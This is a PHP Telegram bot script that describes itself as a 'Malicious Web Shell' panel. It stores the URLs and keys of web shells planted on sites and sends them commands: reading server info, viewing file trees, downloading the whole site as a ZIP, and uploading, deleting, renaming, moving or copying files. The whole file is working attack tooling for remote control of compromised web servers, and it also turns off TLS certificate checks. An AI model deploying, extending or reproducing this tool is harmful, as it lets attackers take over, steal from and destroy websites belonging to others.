<?php
$botToken = "token";
$sitesFile = "sites.json";
$stateFile = "state.json";

if (!file_exists($sitesFile)) {
    file_put_contents($sitesFile, json_encode([]));
}

function loadSites() {
    global $sitesFile;
    $data = file_get_contents($sitesFile);
    $sites = json_decode($data, true);
    if ($sites === null) {
        $sites = [];
        file_put_contents($sitesFile, json_encode([]));
    }
    return $sites;
}

function saveSites($sites) {
    global $sitesFile;
    file_put_contents($sitesFile, json_encode($sites, JSON_PRETTY_PRINT));
}

function loadState() {
    global $stateFile;
    if (!file_exists($stateFile)) return [];
    $data = file_get_contents($stateFile);
    $state = json_decode($data, true);
    if ($state === null) return [];
    return $state;
}

function saveState($state) {
    global $stateFile;
    file_put_contents($stateFile, json_encode($state));
}

$content = file_get_contents("php://input");
$update = json_decode($content, true);
if (!$update) exit;

function sendMessage($chatId, $text, $keyboard = null, $parse_mode = 'HTML') {
    global $botToken;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $text, 'parse_mode' => $parse_mode];
    if ($keyboard) $data['reply_markup'] = json_encode($keyboard);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

function editMessage($chatId, $messageId, $text, $keyboard = null, $parse_mode = 'HTML') {
    global $botToken;
    $url = "https://api.telegram.org/bot$botToken/editMessageText";
    $data = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $text,
        'parse_mode' => $parse_mode
    ];
    if ($keyboard) $data['reply_markup'] = json_encode($keyboard);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

function sendDocument($chatId, $file, $caption = "") {
    global $botToken;
    $url = "https://api.telegram.org/bot$botToken/sendDocument";
    
    if (filter_var($file, FILTER_VALIDATE_URL)) {
        $data = ['chat_id' => $chatId, 'document' => $file, 'caption' => $caption, 'parse_mode' => 'HTML'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    } else {
        $data = ['chat_id' => $chatId, 'caption' => $caption, 'parse_mode' => 'HTML'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        
        if (class_exists('CURLFile')) {
            $data['document'] = new CURLFile($file);
        } else {
            $data['document'] = '@' . $file;
        }
        
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
}

function fetchUrl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    return ['code' => $httpCode, 'data' => $response, 'error' => $error];
}

function buildMainKeyboard() {
    return [
        'inline_keyboard' => [
            [['text' => '♻️ ʟɪꜱᴛ ꜱɪᴛᴇꜱ', 'callback_data' => 'list_sites']],
            [['text' => '⚙ ᴀᴅᴅ ɴᴇᴡ ꜱɪᴛᴇ', 'callback_data' => 'add_site']]
        ]
    ];
}

function buildSiteKeyboard($index) {
    global $sites;
    $site = $sites[$index];
    $baseUrl = $site['url'] . '?key=' . $site['key'];
    return [
        'inline_keyboard' => [
            [
                ['text' => '🌐 ꜱᴇʀᴠᴇʀ ɪɴꜰᴏ', 'callback_data' => 'info_' . $index],
                ['text' => '🛜 ᴛʀᴇᴇ ᴠɪᴇᴡ', 'url' => $baseUrl . '&action=tree']
            ],
            [
                ['text' => '🔰 ᴅᴏᴡɴʟᴏᴀᴅ ᴀʟʟ', 'callback_data' => 'download_all_' . $index],
                ['text' => '📁 ᴅᴏᴡɴʟᴏᴀᴅ ꜰɪʟᴇ', 'callback_data' => 'file_' . $index]
            ],
            [
                ['text' => '📤 ᴜᴘʟᴏᴀᴅ ꜰɪʟᴇ', 'callback_data' => 'upload_' . $index],
                ['text' => '🗑️ ᴅᴇʟᴇᴛᴇ ꜰɪʟᴇ', 'callback_data' => 'delete_' . $index]
            ],
            [
                ['text' => '💠 ʀᴇɴᴀᴍᴇ ꜰɪʟᴇ', 'callback_data' => 'rename_' . $index],
                ['text' => '📂 ᴍᴏᴠᴇ ꜰɪʟᴇ', 'callback_data' => 'move_' . $index]
            ],
            [
                ['text' => '💾 ᴄᴏᴘʏ ꜰɪʟᴇ', 'callback_data' => 'copy_' . $index],
                ['text' => '🗑️ ᴅᴇʟᴇᴛᴇ ꜱɪᴛᴇ', 'callback_data' => 'delete_site_' . $index]
            ],
            [
                ['text' => '🔙 ʙᴀᴄᴋ', 'callback_data' => 'back_main']
            ]
        ]
    ];
}

$sites = loadSites();
$state = loadState();

if (isset($update['message'])) {
    $chatId = $update['message']['chat']['id'];
    $text = $update['message']['text'] ?? '';

    if ($text == '/start') {
        if (isset($state[$chatId])) unset($state[$chatId]);
        saveState($state);
        sendMessage($chatId, "🚀 <b>ᴍᴀʟɪᴄɪᴏᴜꜱ ᴡᴇʙ ꜱʜᴇʟʟ</b>\n⚡ <i>ꜱᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ:</i>", buildMainKeyboard());
    } elseif (isset($state[$chatId]) && $state[$chatId]['step'] == 'waiting_url') {
        $url = trim($text);
        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            sendMessage($chatId, "❌ <b>ɪɴᴠᴀʟɪᴅ ᴜʀʟ!</b>\nᴘʟᴇᴀꜱᴇ ᴇɴᴛᴇʀ ᴀ ᴠᴀʟɪᴅ ᴜʀʟ ᴡɪᴛʜ ʜᴛᴛᴘ/ʜᴛᴛᴘꜱ.");
            unset($state[$chatId]);
            saveState($state);
            return;
        }
        $state[$chatId]['url'] = $url;
        $state[$chatId]['step'] = 'waiting_key';
        saveState($state);
        sendMessage($chatId, "🔑 <b>ᴇɴᴛᴇʀ ᴛʜᴇ ᴋᴇʏ ꜰᴏʀ ᴛʜɪꜱ ꜱɪᴛᴇ:</b>");
    } elseif (isset($state[$chatId]) && $state[$chatId]['step'] == 'waiting_key') {
        $key = trim($text);
        if (empty($key)) {
            sendMessage($chatId, "❌ <b>ᴋᴇʏ ᴄᴀɴɴᴏᴛ ʙᴇ ᴇᴍᴘᴛʏ!</b>");
            return;
        }
        $newSite = [
            'name' => parse_url($state[$chatId]['url'], PHP_URL_HOST) ?: 'unknown',
            'url' => $state[$chatId]['url'],
            'key' => $key
        ];
        $sites[] = $newSite;
        saveSites($sites);
        $messageId = $state[$chatId]['message_id'] ?? 0;
        unset($state[$chatId]);
        saveState($state);
        
        if ($messageId > 0) {
            editMessage($chatId, $messageId, "✅ <b>ꜱɪᴛᴇ ᴀᴅᴅᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ!</b>\n🌐 <i>ɴᴀᴍᴇ:</i> " . $newSite['name'], buildMainKeyboard());
        } else {
            sendMessage($chatId, "✅ <b>ꜱɪᴛᴇ ᴀᴅᴅᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ!</b>\n🌐 <i>ɴᴀᴍᴇ:</i> " . $newSite['name'], buildMainKeyboard());
        }
    } elseif (isset($state[$chatId]) && $state[$chatId]['step'] == 'file_download') {
        $filePath = trim($text);
        $filePath = ltrim($filePath, '/');
        if (!empty($filePath)) {
            $index = $state[$chatId]['site_index'];
            if ($index < count($sites)) {
                $site = $sites[$index];
                $downloadUrl = $site['url'] . '?key=' . $site['key'] . '&action=download_file&path=' . urlencode($filePath);
                $button = ['inline_keyboard' => [[['text' => '📥 ᴅᴏᴡɴʟᴏᴀᴅ ' . basename($filePath), 'url' => $downloadUrl]]]];
                sendMessage($chatId, "📁 <b>ꜰɪʟᴇ:</b> <code>$filePath</code>\n👇 <i>ᴄʟɪᴄᴋ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ:</i>", $button);
                unset($state[$chatId]);
                saveState($state);
            }
        }
    } elseif (isset($state[$chatId]) && $state[$chatId]['step'] == 'waiting_upload_path') {
        $state[$chatId]['upload_path'] = trim($text);
        $state[$chatId]['step'] = 'waiting_upload_file';
        saveState($state);
        sendMessage($chatId, "📤 <b>ɴᴏᴡ ꜱᴇɴᴅ ᴛʜᴇ ꜰɪʟᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴜᴘʟᴏᴀᴅ.</b>\n📍 <i>ᴛᴀʀɢᴇᴛ ꜰᴏʟᴅᴇʀ:</i> <code>" . $state[$chatId]['upload_path'] . "</code>\n🌐 <i>ꜱɪᴛᴇ: " . $sites[$state[$chatId]['site_index']]['name'] . "</i>");
    } elseif (isset($state[$chatId]) && $state[$chatId]['step'] == 'waiting_upload_file') {
        if (isset($update['message']['document'])) {
            $fileId = $update['message']['document']['file_id'];
            $fileName = $update['message']['document']['file_name'];
            
            $getFile = file_get_contents("https://api.telegram.org/bot$botToken/getFile?file_id=$fileId");
            $fileData = json_decode($getFile, true);
            
            if ($fileData['ok']) {
                $filePath = $fileData['result']['file_path'];
                $fileUrl = "https://api.telegram.org/file/bot$botToken/$filePath";
                $fileContent = file_get_contents($fileUrl);
                
                if ($fileContent === false) {
                    sendMessage($chatId, "❌ ꜰᴀɪʟᴇᴅ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ ꜰɪʟᴇ ꜰʀᴏᴍ ᴛᴇʟᴇɢʀᴀᴍ.");
                    unset($state[$chatId]);
                    saveState($state);
                    return;
                }
                
                $site = $sites[$state[$chatId]['site_index']];
                $uploadPath = $state[$chatId]['upload_path'];
                $uploadUrl = $site['url'] . '?key=' . $site['key'] . '&action=upload&path=' . urlencode($uploadPath);
                
                $boundary = uniqid();
                $delimiter = '-------------' . $boundary;
                
                $postData = "--" . $delimiter . "\r\n";
                $postData .= 'Content-Disposition: form-data; name="file"; filename="' . $fileName . '"' . "\r\n";
                $postData .= 'Content-Type: application/octet-stream' . "\r\n\r\n";
                $postData .= $fileContent . "\r\n";
                $postData .= "--" . $delimiter . "--\r\n";
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $uploadUrl);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    'Content-Type: multipart/form-data; boundary=' . $delimiter,
                    'Content-Length: ' . strlen($postData)
                ]);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_TIMEOUT, 30);
                $result = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curlError = curl_error($ch);
                curl_close($ch);
                
                if ($result === false) {
                    sendMessage($chatId, "❌ ᴜᴘʟᴏᴀᴅ ꜰᴀɪʟᴇᴅ: ᴄᴜʀʟ ᴇʀʀᴏʀ - " . $curlError);
                } else {
                    $response = "📤 <b>ᴜᴘʟᴏᴀᴅ ʀᴇꜱᴜʟᴛ:</b>\n";
                    $response .= "━━━━━━━━━━━━━━━━━━━━━\n";
                    $response .= "ʜᴛᴛᴘ ᴄᴏᴅᴇ: " . $httpCode . "\n";
                    $response .= "ʀᴇꜱᴘᴏɴꜱᴇ:\n<pre>" . htmlspecialchars($result) . "</pre>";
                    sendMessage($chatId, $response);
                }
                
                $messageId = $state[$chatId]['message_id'] ?? 0;
                unset($state[$chatId]);
                saveState($state);
                
                if ($messageId > 0) {
                    editMessage($chatId, $messageId, "🔹 <b>ᴘᴀɴᴇʟ ꜰᴏʀ</b> " . $site['name'], buildSiteKeyboard($state[$chatId]['site_index']));
                }
            } else {
                sendMessage($chatId, "❌ ꜰᴀɪʟᴇᴅ ᴛᴏ ɢᴇᴛ ꜰɪʟᴇ ꜰʀᴏᴍ ᴛᴇʟᴇɢʀᴀᴍ: " . ($fileData['description'] ?? 'ᴜɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ'));
            }
        } else {
            sendMessage($chatId, "❌ ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀ ꜰɪʟᴇ (ᴅᴏᴄᴜᴍᴇɴᴛ).");
        }
    } elseif (isset($state[$chatId]) && $state[$chatId]['step'] == 'waiting_delete_path') {
        $deletePath = trim($text);
        $deletePath = ltrim($deletePath, '/');
        if (!empty($deletePath)) {
            $index = $state[$chatId]['site_index'];
            if ($index < count($sites)) {
                $site = $sites[$index];
                $deleteUrl = $site['url'] . '?key=' . $site['key'] . '&action=delete&path=' . urlencode($deletePath);
                $result = fetchUrl($deleteUrl);
                if ($result['code'] == 200) {
                    $response = "🗑️ <b>ᴅᴇʟᴇᴛᴇ ʀᴇꜱᴜʟᴛ:</b>\n";
                    $response .= "━━━━━━━━━━━━━━━━━━━━━\n";
                    $response .= "ʜᴛᴛᴘ ᴄᴏᴅᴇ: " . $result['code'] . "\n";
                    $response .= "ʀᴇꜱᴘᴏɴꜱᴇ:\n<pre>" . htmlspecialchars($result['data']) . "</pre>";
                    sendMessage($chatId, $response);
                } else {
                    sendMessage($chatId, "❌ ꜰᴀɪʟᴇᴅ ᴛᴏ ᴅᴇʟᴇᴛᴇ.\nʜᴛᴛᴘ ᴄᴏᴅᴇ: " . $result['code'] . "\nᴇʀʀᴏʀ: " . $result['error']);
                }
                $messageId = $state[$chatId]['message_id'] ?? 0;
                unset($state[$chatId]);
                saveState($state);
                
                if ($messageId > 0) {
                    editMessage($chatId, $messageId, "🔹 <b>ᴘᴀɴᴇʟ ꜰᴏʀ</b> " . $site['name'], buildSiteKeyboard($index));
                }
            }
        }
    } elseif (isset($state[$chatId]) && $state[$chatId]['step'] == 'waiting_rename_old') {
        $state[$chatId]['old_path'] = trim($text);
        $state[$chatId]['step'] = 'waiting_rename_new';
        saveState($state);
        sendMessage($chatId, "✏️ <b>ᴇɴᴛᴇʀ ɴᴇᴡ ᴘᴀᴛʜ:</b>\n<code>ss/new_name.py</code>");
    } elseif (isset($state[$chatId]) && $state[$chatId]['step'] == 'waiting_rename_new') {
        $index = $state[$chatId]['site_index'];
        $oldPath = ltrim($state[$chatId]['old_path'], '/');
        $newPath = ltrim($text, '/');
        $site = $sites[$index];
        $renameUrl = $site['url'] . '?key=' . $site['key'] . '&action=rename&old=' . urlencode($oldPath) . '&new=' . urlencode($newPath);
        $result = fetchUrl($renameUrl);
        sendMessage($chatId, "✏️ <b>ʀᴇɴᴀᴍᴇ ʀᴇꜱᴜʟᴛ:</b>\n<pre>" . htmlspecialchars($result['data']) . "</pre>");
        $messageId = $state[$chatId]['message_id'] ?? 0;
        unset($state[$chatId]);
        saveState($state);
        
        if ($messageId > 0) {
            editMessage($chatId, $messageId, "🔹 <b>ᴘᴀɴᴇʟ ꜰᴏʀ</b> " . $site['name'], buildSiteKeyboard($index));
        }
    } elseif (isset($state[$chatId]) && $state[$chatId]['step'] == 'waiting_move_from') {
        $state[$chatId]['from_path'] = trim($text);
        $state[$chatId]['step'] = 'waiting_move_to';
        saveState($state);
        sendMessage($chatId, "📂 <b>ᴇɴᴛᴇʀ ᴅᴇꜱᴛɪɴᴀᴛɪᴏɴ ᴘᴀᴛʜ:</b>\n<code>ss/destination/</code>");
    } elseif (isset($state[$chatId]) && $state[$chatId]['step'] == 'waiting_move_to') {
        $index = $state[$chatId]['site_index'];
        $from = ltrim($state[$chatId]['from_path'], '/');
        $to = ltrim($text, '/');
        $site = $sites[$index];
        $moveUrl = $site['url'] . '?key=' . $site['key'] . '&action=move&from=' . urlencode($from) . '&to=' . urlencode($to);
        $result = fetchUrl($moveUrl);
        sendMessage($chatId, "📂 <b>ᴍᴏᴠᴇ ʀᴇꜱᴜʟᴛ:</b>\n<pre>" . htmlspecialchars($result['data']) . "</pre>");
        $messageId = $state[$chatId]['message_id'] ?? 0;
        unset($state[$chatId]);
        saveState($state);
        
        if ($messageId > 0) {
            editMessage($chatId, $messageId, "🔹 <b>ᴘᴀɴᴇʟ ꜰᴏʀ</b> " . $site['name'], buildSiteKeyboard($index));
        }
    } elseif (isset($state[$chatId]) && $state[$chatId]['step'] == 'waiting_copy_from') {
        $state[$chatId]['from_path'] = trim($text);
        $state[$chatId]['step'] = 'waiting_copy_to';
        saveState($state);
        sendMessage($chatId, "📋 <b>ᴇɴᴛᴇʀ ᴅᴇꜱᴛɪɴᴀᴛɪᴏɴ ᴘᴀᴛʜ:</b>\n<code>ss/destination/</code>");
    } elseif (isset($state[$chatId]) && $state[$chatId]['step'] == 'waiting_copy_to') {
        $index = $state[$chatId]['site_index'];
        $from = ltrim($state[$chatId]['from_path'], '/');
        $to = ltrim($text, '/');
        $site = $sites[$index];
        $copyUrl = $site['url'] . '?key=' . $site['key'] . '&action=copy&from=' . urlencode($from) . '&to=' . urlencode($to);
        $result = fetchUrl($copyUrl);
        sendMessage($chatId, "📋 <b>ᴄᴏᴘʏ ʀᴇꜱᴜʟᴛ:</b>\n<pre>" . htmlspecialchars($result['data']) . "</pre>");
        $messageId = $state[$chatId]['message_id'] ?? 0;
        unset($state[$chatId]);
        saveState($state);
        
        if ($messageId > 0) {
            editMessage($chatId, $messageId, "🔹 <b>ᴘᴀɴᴇʟ ꜰᴏʀ</b> " . $site['name'], buildSiteKeyboard($index));
        }
    }
}

if (isset($update['callback_query'])) {
    $callback = $update['callback_query'];
    $chatId = $callback['message']['chat']['id'];
    $messageId = $callback['message']['message_id'];
    $data = $callback['data'];

    if ($data == 'list_sites') {
        if (empty($sites)) {
            editMessage($chatId, $messageId, "📭 <b>ɴᴏ ꜱɪᴛᴇꜱ ᴀᴅᴅᴇᴅ ʏᴇᴛ.</b>\nᴜꜱᴇ <code>⚙ ᴀᴅᴅ ɴᴇᴡ ꜱɪᴛᴇ</code> ᴛᴏ ᴀᴅᴅ ᴏɴᴇ.", buildMainKeyboard());
        } else {
            $keyboard = ['inline_keyboard' => []];
            foreach ($sites as $index => $site) {
                $keyboard['inline_keyboard'][] = [['text' => '🌐 ' . $site['name'], 'callback_data' => 'site_' . $index]];
            }
            $keyboard['inline_keyboard'][] = [['text' => '🔙 ʙᴀᴄᴋ', 'callback_data' => 'back_main']];
            editMessage($chatId, $messageId, "📋 <b>ꜱᴇʟᴇᴄᴛ ᴀ ꜱɪᴛᴇ:</b>", $keyboard);
        }
    } elseif ($data == 'add_site') {
        $state[$chatId] = ['step' => 'waiting_url', 'message_id' => $messageId];
        saveState($state);
        editMessage($chatId, $messageId, "🌐 <b>ᴇɴᴛᴇʀ ᴛʜᴇ ꜱɪᴛᴇ ᴜʀʟ (ᴡɪᴛʜ ʜᴛᴛᴘ/ʜᴛᴛᴘꜱ):</b>\n<code>https://example.com/shell.php</code>", null);
    } elseif ($data == 'back_main') {
        if (isset($state[$chatId])) unset($state[$chatId]);
        saveState($state);
        editMessage($chatId, $messageId, "🚀 <b>ᴍᴀʟɪᴄɪᴏᴜꜱ ᴡᴇʙ ꜱʜᴇʟʟ</b>\n⚡ <i>ꜱᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ:</i>", buildMainKeyboard());
    } elseif (strpos($data, 'site_') === 0) {
        $index = (int) substr($data, 5);
        if ($index < count($sites)) {
            $keyboard = buildSiteKeyboard($index);
            editMessage($chatId, $messageId, "🔹 <b>ᴘᴀɴᴇʟ ꜰᴏʀ</b> " . $sites[$index]['name'], $keyboard);
        } else {
            editMessage($chatId, $messageId, "❌ <b>ꜱɪᴛᴇ ɴᴏᴛ ꜰᴏᴜɴᴅ!</b>", buildMainKeyboard());
        }
    } elseif (strpos($data, 'info_') === 0) {
        $index = (int) substr($data, 5);
        if ($index < count($sites)) {
            $site = $sites[$index];
            $infoUrl = $site['url'] . '?key=' . $site['key'] . '&action=info';
            
            editMessage($chatId, $messageId, "🔹 <b>ᴘᴀɴᴇʟ ꜰᴏʀ</b> " . $sites[$index]['name'], buildSiteKeyboard($index));
            
            sendMessage($chatId, "⏳ <b>ꜰᴇᴛᴄʜɪɴɢ ꜱᴇʀᴠᴇʀ ɪɴꜰᴏ...</b>");
            $result = fetchUrl($infoUrl);
            if ($result['code'] == 200 && !empty($result['data'])) {
                $infoText = "```bash\n" . $result['data'] . "\n```";
                sendMessage($chatId, $infoText, null, 'Markdown');
            } else {
                $errorMsg = "❌ <b>ꜰᴀɪʟᴇᴅ ᴛᴏ ꜰᴇᴛᴄʜ ꜱᴇʀᴠᴇʀ ɪɴꜰᴏ.</b>\n";
                if ($result['error']) {
                    $errorMsg .= "ᴇʀʀᴏʀ: " . $result['error'];
                } else {
                    $errorMsg .= "ʜᴛᴛᴘ ᴄᴏᴅᴇ: " . $result['code'] . "\nʀᴇꜱᴘᴏɴꜱᴇ: " . htmlspecialchars(substr($result['data'], 0, 200));
                }
                sendMessage($chatId, $errorMsg);
            }
        }
    } elseif (strpos($data, 'download_all_') === 0) {
        $index = (int) substr($data, 13);
        if ($index < count($sites)) {
            $site = $sites[$index];
            $zipUrl = $site['url'] . '?key=' . $site['key'] . '&action=download_all';
            
            $button = [
                'inline_keyboard' => [
                    [
                        ['text' => '📥 ᴅᴏᴡɴʟᴏᴀᴅ ʙᴀᴄᴋᴜᴘ (ZIP)', 'url' => $zipUrl]
                    ],
                    [
                        ['text' => '🔙 ʙᴀᴄᴋ', 'callback_data' => 'site_' . $index]
                    ]
                ]
            ];
            
            editMessage($chatId, $messageId, "📦 <b>ꜰᴜʟʟ ʙᴀᴄᴋᴜᴘ ʀᴇᴀᴅʏ</b>\n📌 <i>ᴜꜱᴇ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴀɴᴀɢᴇʀ ꜰᴏʀ ʟᴀʀɢᴇ ꜰɪʟᴇꜱ</i>\n👇 <i>ᴄʟɪᴄᴋ ʙᴜᴛᴛᴏɴ ᴛᴏ ꜱᴛᴀʀᴛ:</i>", $button);
        }
    } elseif (strpos($data, 'delete_site_') === 0) {
        $index = (int) substr($data, 11);
        if ($index < count($sites)) {
            $name = $sites[$index]['name'];
            array_splice($sites, $index, 1);
            saveSites($sites);
            editMessage($chatId, $messageId, "🗑️ <b>ꜱɪᴛᴇ</b> <code>$name</code> <b>ᴅᴇʟᴇᴛᴇᴅ.</b>", buildMainKeyboard());
        }
    } elseif (strpos($data, 'delete_') === 0) {
        $index = (int) substr($data, 7);
        if ($index < count($sites)) {
            $state[$chatId] = ['step' => 'waiting_delete_path', 'site_index' => $index, 'message_id' => $messageId];
            saveState($state);
            
            editMessage($chatId, $messageId, "🔹 <b>ᴘᴀɴᴇʟ ꜰᴏʀ</b> " . $sites[$index]['name'], buildSiteKeyboard($index));
            
            sendMessage($chatId, "🗑️ <b>ᴇɴᴛᴇʀ ᴘᴀᴛʜ ᴛᴏ ᴅᴇʟᴇᴛᴇ (ꜰɪʟᴇ ᴏʀ ꜰᴏʟᴅᴇʀ):</b>\n<code>ss/file.py</code> ᴏʀ <code>ss/folder/</code>\n⚠️ <i>ᴛʜɪꜱ ᴀᴄᴛɪᴏɴ ɪꜱ ɪʀʀᴇᴠᴇʀꜱɪʙʟᴇ!</i>\n🌐 <i>ꜱɪᴛᴇ: " . $sites[$index]['name'] . "</i>");
        }
    } elseif (strpos($data, 'rename_') === 0) {
        $index = (int) substr($data, 7);
        if ($index < count($sites)) {
            $state[$chatId] = ['step' => 'waiting_rename_old', 'site_index' => $index, 'message_id' => $messageId];
            saveState($state);
            
            editMessage($chatId, $messageId, "🔹 <b>ᴘᴀɴᴇʟ ꜰᴏʀ</b> " . $sites[$index]['name'], buildSiteKeyboard($index));
            
            sendMessage($chatId, "✏️ <b>ᴇɴᴛᴇʀ ᴄᴜʀʀᴇɴᴛ ᴘᴀᴛʜ:</b>\n<code>ss/old_name.py</code>\n🌐 <i>ꜱɪᴛᴇ: " . $sites[$index]['name'] . "</i>");
        }
    } elseif (strpos($data, 'move_') === 0) {
        $index = (int) substr($data, 5);
        if ($index < count($sites)) {
            $state[$chatId] = ['step' => 'waiting_move_from', 'site_index' => $index, 'message_id' => $messageId];
            saveState($state);
            
            editMessage($chatId, $messageId, "🔹 <b>ᴘᴀɴᴇʟ ꜰᴏʀ</b> " . $sites[$index]['name'], buildSiteKeyboard($index));
            
            sendMessage($chatId, "📂 <b>ᴇɴᴛᴇʀ ꜱᴏᴜʀᴄᴇ ᴘᴀᴛʜ:</b>\n<code>ss/file.py</code>\n🌐 <i>ꜱɪᴛᴇ: " . $sites[$index]['name'] . "</i>");
        }
    } elseif (strpos($data, 'copy_') === 0) {
        $index = (int) substr($data, 5);
        if ($index < count($sites)) {
            $state[$chatId] = ['step' => 'waiting_copy_from', 'site_index' => $index, 'message_id' => $messageId];
            saveState($state);
            
            editMessage($chatId, $messageId, "🔹 <b>ᴘᴀɴᴇʟ ꜰᴏʀ</b> " . $sites[$index]['name'], buildSiteKeyboard($index));
            
            sendMessage($chatId, "📋 <b>ᴇɴᴛᴇʀ ꜱᴏᴜʀᴄᴇ ᴘᴀᴛʜ:</b>\n<code>ss/file.py</code>\n🌐 <i>ꜱɪᴛᴇ: " . $sites[$index]['name'] . "</i>");
        }
    } elseif (strpos($data, 'file_') === 0) {
        $index = (int) substr($data, 5);
        if ($index < count($sites)) {
            $state[$chatId] = ['step' => 'file_download', 'site_index' => $index, 'message_id' => $messageId];
            saveState($state);
            
            editMessage($chatId, $messageId, "🔹 <b>ᴘᴀɴᴇʟ ꜰᴏʀ</b> " . $sites[$index]['name'], buildSiteKeyboard($index));
            
            sendMessage($chatId, "📁 <b>ᴇɴᴛᴇʀ ꜰɪʟᴇ ᴘᴀᴛʜ (ᴡɪᴛʜᴏᴜᴛ ʟᴇᴀᴅɪɴɢ /):</b>\n<code>HHH/panel.php</code>\n🌐 <i>ꜱɪᴛᴇ: " . $sites[$index]['name'] . "</i>");
        }
    } elseif (strpos($data, 'upload_') === 0) {
        $index = (int) substr($data, 7);
        if ($index < count($sites)) {
            $state[$chatId] = ['step' => 'waiting_upload_path', 'site_index' => $index, 'message_id' => $messageId];
            saveState($state);
            
            editMessage($chatId, $messageId, "🔹 <b>ᴘᴀɴᴇʟ ꜰᴏʀ</b> " . $sites[$index]['name'], buildSiteKeyboard($index));
            
            sendMessage($chatId, "📤 <b>ᴇɴᴛᴇʀ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ꜰᴏʟᴅᴇʀ (ᴡɪᴛʜᴏᴜᴛ ʟᴇᴀᴅɪɴɢ /):</b>\n<code>ss/</code> ᴏʀ <code>public_html/</code>\n🌐 <i>ꜱɪᴛᴇ: " . $sites[$index]['name'] . "</i>\n📌 <i>ꜰɪʟᴇ ᴡɪʟʟ ʙᴇ ꜱᴀᴠᴇᴅ ᴡɪᴛʜ ɪᴛꜱ ᴏʀɪɢɪɴᴀʟ ɴᴀᴍᴇ</i>");
        }
    }

    file_get_contents("https://api.telegram.org/bot$botToken/answerCallbackQuery?callback_query_id=" . $callback['id']);
}
?>